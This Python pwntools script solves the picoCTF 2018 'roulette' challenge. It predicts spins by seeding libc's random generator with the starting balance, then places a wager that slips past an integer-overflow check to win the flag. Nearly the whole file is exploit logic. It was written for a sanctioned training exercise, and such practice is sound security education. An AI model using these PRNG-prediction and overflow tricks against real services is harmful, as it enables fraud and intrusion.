from pwn import *
from ctypes import CDLL

from solver import solve

libc = CDLL('libc.so.6')

win_msgs = [
  "Wow.. Nice One!",
  "You chose correct!",
  "Winner!",
  "Wow, you won!",
  "Alright, now you're cooking!",
  "Darn.. Here you go",
  "Darn, you got it right.",
  "You.. win.. this round...",
  "Congrats!",
  "You're not cheating are you?",
]

lose_msgs1 = [
  "WRONG",
  "Nice try..",
  "YOU LOSE",
  "Not this time..",
  "Better luck next time..."
]

lose_msgs2 = [
  "Just give up!",
  "It's over for you.",
  "Stop wasting your time.",
  "You're never gonna win",
  "If you keep it up, maybe you'll get the flag in 100000000000 years"
]

context.log_level = 'info'


io = remote('2018shell2.picoctf.com', 26662)
#io = process('./roulette')



WELCOME = 'Welcome to ONLINE ROULETTE!\n'
OUT_OF_MONEY = 'Haha, lost all the money I gave you already? See ya later!\n'
WAGER_PROMPT = 'How much will you wager?\n'


# get past game intro
io.recvuntil(WELCOME)
io.recvuntil('Here, have $')
starting_balance = int(io.recvuntil(' ').strip())
io.recvline()
io.recvline()

# initialize random seed as the starting balance, bug #1
libc.srand(starting_balance)

# evades the long overflow detection, when cast to long is negative so is below our current cash value, when multiplied by 2 is very large :D

while True:
  first_line = io.recvline()

  if first_line == OUT_OF_MONEY:
    log.error(OUT_OF_MONEY)
    break
  elif first_line == WAGER_PROMPT:
    pass
  elif first_line.startswith('*** Current Balance: '):
    io.recvuntil('Wow, I can\'t believe you did it.. You deserve this flag!\n')
    flag = io.recvline(keepends = False)
    log.info(flag)
    break
  else:
    log.warn('unknown message: %s' % first_line)
    break

  io.recvuntil('Current Balance: $')
  current_balance = int(io.recvuntil(' ').strip())
  io.recvuntil('Current Wins: ')
  current_wins = int(io.recvuntil('\n').strip())

  log.info('balance: %s wins: %s' % (current_balance, current_wins))

  next_spin = (libc.rand() % 36) + 1
  not_next_spin = (next_spin + 1) % 36


  number, wager = (not_next_spin, solve(current_balance)) if current_wins == 3 else (next_spin, 1)

  log.info('betting $%s on %s.' % (wager, number))

  io.recvuntil('> ')
  io.sendline(str(wager))

  line = io.recvline()

  if line != 'Choose a number (1-36)\n':
    log.error(line)

  io.recvuntil('> ')
  io.sendline(str(number))

  io.recvline()
  io.recvline()
  io.recvline()

  result_line = io.recvline()

  log.debug(result_line)

  result = int(result_line.split('\x08')[-1].strip())

  io.recvline()

  log.info('result: %s' % result)

  msg1 = io.recvline(keepends=False)
  libc.rand()

  if msg1 in win_msgs:
    log.info('we won :)')
  else:
    log.warn('we lost :(')
    msg2 = io.recvline(keepends=False)
    libc.rand()
  io.recvline()
